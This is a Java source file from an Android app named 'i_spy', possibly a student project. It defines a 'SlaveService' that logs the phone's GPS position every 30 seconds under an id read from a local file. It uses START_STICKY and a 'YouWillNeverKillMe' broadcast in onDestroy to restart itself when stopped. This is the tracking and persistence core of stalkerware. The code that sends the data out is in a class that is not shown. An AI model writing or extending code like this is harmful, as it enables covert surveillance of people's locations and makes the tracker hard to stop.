package com.um.asn.i_spy.services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.support.annotation.Nullable;

import com.um.asn.i_spy.models.PositionGPS;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;

public class SlaveService extends IntentService {

    private final long TIME_BETWEEN_GET_DATA_GPS_MS = 1000 * 30;
    private Handler handler = new Handler();
    private String id_phone;

    private final Runnable getGPS = new Runnable(){
        public void run(){
            try {
                System.out.println("Save Position...");

                PositionGPS posGPS = new PositionGPS(getApplicationContext(), id_phone);
                posGPS.saveLocation((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE));

                handler.postDelayed(this, TIME_BETWEEN_GET_DATA_GPS_MS);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    public SlaveService() {
        super("SlaveService");
    }

    public void getIdPhone(){
        try {
            FileInputStream file = openFileInput("slave.txt");
            InputStreamReader inputStreamReader = new InputStreamReader(file);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
            }

            JSONObject jo = new JSONObject(sb.toString());

            this.id_phone = (String)jo.get("id");

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        getIdPhone();
        handler.post(getGPS);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("YouWillNeverKillMe"));
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        return;
    }
}
